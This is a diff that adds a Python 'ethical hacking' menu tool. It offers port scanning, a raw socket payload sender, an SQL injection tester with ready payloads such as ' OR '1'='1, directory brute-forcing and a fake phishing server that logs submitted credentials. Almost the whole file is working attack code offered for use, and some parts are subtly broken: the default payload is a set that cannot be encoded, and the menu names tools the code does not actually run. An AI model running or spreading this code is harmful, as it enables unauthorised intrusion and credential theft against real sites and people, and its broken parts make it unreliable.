@@ -1,0 +1,152 @@
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import os
+import socket
+import requests
+from colorama import Fore, init
+
+init(autoreset=True)
+
+# ====================== Banner ======================
+def banner():
+    print(Fore.BLUE + r"""
+██████╗  ██████╗ ██╗   ██╗███████╗ ██████╗  █████╗     ███████╗███╗   ██╗
+██╔══██╗██╔═══██╗██║   ██║██╔════╝██╔════╝ ██╔══██╗    ██╔════╝████╗  ██║
+██║  ██║██║   ██║██║   ██║█████╗  ██║  ███╗███████║    █████╗  ██╔██╗ ██║
+██║  ██║██║   ██║██║   ██║██╔══╝  ██║   ██║██╔══██║    ██╔══╝  ██║╚██╗██║
+██████╔╝╚██████╔╝╚██████╔╝███████╗╚██████╔╝██║  ██║    ███████╗██║ ╚████║
+╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═══╝
+
+                """ + Fore.YELLOW + "      [DOVEGA E.N Ethical Tool]\n"
+          + Fore.CYAN + "                Instagram: @C.4.C.7\n")
+
+
+# ====================== Port Scanner ======================
+def port_scan(target):
+    print(Fore.GREEN + f"\n[+] Scanning ports on {target}...")
+    common_ports = [21, 22, 23, 25, 80, 139, 443, 445, 3306, 8080]
+    for port in common_ports:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            result = s.connect_ex((target, port))
+            if result == 0:
+                print(Fore.CYAN + f"[+] Port {port} OPEN")
+            s.close()
+        except:
+            pass
+
+# ====================== Send Payload ======================
+def send_payload(target, port, payload={("hello")}):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.send(payload.encode())
+        print(Fore.GREEN + f"[+] Payload sent successfully to {target}:{port}")
+        try:
+            response = s.recv(1024).decode(errors="ignore")
+            print(Fore.CYAN + f"[+] Response: {response}")
+        except:
+            print(Fore.YELLOW + "[!] No response from target.")
+        s.close()
+    except Exception as e:
+        print(Fore.RED + f"[-] Failed to send payload: {e}")
+
+# ====================== Web Scanner ======================
+def web_scan(url):
+    try:
+        r = requests.get(url, timeout=5)
+        print("\n[+] Server Headers:")
+        for k, v in r.headers.items():
+            print(f"   {k}: {v}")
+
+        if "X-Frame-Options" not in r.headers:
+            print("[-] Missing X-Frame-Options (clickjacking risk)")
+        if "X-XSS-Protection" not in r.headers:
+            print("[-] Missing X-XSS-Protection")
+        if "Server" in r.headers:
+            print(f"[i] Server info: {r.headers['Server']}")
+    except Exception as e:
+        print(f"[!] Error in web_scan: {e}")
+
+# ====================== SQL Injection Tester ======================
+def sql_injection_test(url, param="id"):
+    payloads = ["1'", "' OR '1'='1", "admin'--", "' OR 'a'='a"]
+    for p in payloads:
+        test_url = f"{url}?{param}={p}"
+        try:
+            r = requests.get(test_url, timeout=5)
+            if "error" in r.text.lower() or "sql" in r.text.lower():
+                print(Fore.GREEN + f"[+] Possible SQL Injection with payload: {p}")
+        except:
+            pass
+
+# ====================== Directory Bruteforce ======================
+def dir_bruteforce(url, wordlist=["admin", "login", "dashboard", "uploads"]):
+    for path in wordlist:
+        test_url = f"{url}/{path}"
+        try:
+            r = requests.get(test_url, timeout=5)
+            if r.status_code == 200:
+                print(Fore.GREEN + f"[+] Found directory: {test_url}")
+        except:
+            pass
+
+# ====================== Fake Phishing Page ======================
+def phishing_page():
+    print("\n[+] Running fake phishing page on http://127.0.0.1:8080")
+    from http.server import SimpleHTTPRequestHandler, HTTPServer
+
+    class PhishHandler(SimpleHTTPRequestHandler):
+        def do_POST(self):
+            length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(length)
+            print(f"[+] Captured credentials: {post_data.decode()}")
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"Login failed. Please try again.")
+
+    server = HTTPServer(('0.0.0.0', 8080), PhishHandler)
+    server.serve_forever()
+
+# ====================== Main Menu ======================
+def main():
+    banner()
+    print(Fore.GREEN + "[1] Port Scanner")
+    print(Fore.GREEN + "[2] Send Payload")
+    print(Fore.GREEN + "[3] Web Scanner (Nikto)")
+    print(Fore.GREEN + "[4] SQL Injection Tester (SQLmap)")
+    print(Fore.GREEN + "[5] Directory Bruteforce (Gobuster)")
+    print(Fore.GREEN + "[6] Fake Phishing Page (Zphisher)")
+    print(Fore.GREEN + "[0] Exit")
+
+    choice = input(Fore.CYAN + "\n[?] Select option: ")
+
+    if choice == "1":
+        target = input("Enter target IP: ")
+        port_scan(target)
+    elif choice == "2":
+        target = input("Enter target IP: ")
+        port = int(input("Enter target port: "))
+        send_payload(target, port)
+    elif choice == "3":
+        target = input("Enter target URL: ")
+        web_scan(target)
+    elif choice == "4":
+        target = input("Enter target URL (ex: http://site.com/page.php): ")
+        param = input("Enter vulnerable parameter (default=id): ") or "id"
+        sql_injection_test(target, param)
+    elif choice == "5":
+        target = input("Enter target URL: ")
+        dir_bruteforce(target)
+    elif choice == "6":
+        phishing_page()
+    elif choice == "0":
+        print(Fore.RED + "Exiting...")
+        exit()
+    else:
+        print(Fore.RED + "Invalid option!")
+
+if __name__ == "__main__":
+    main()
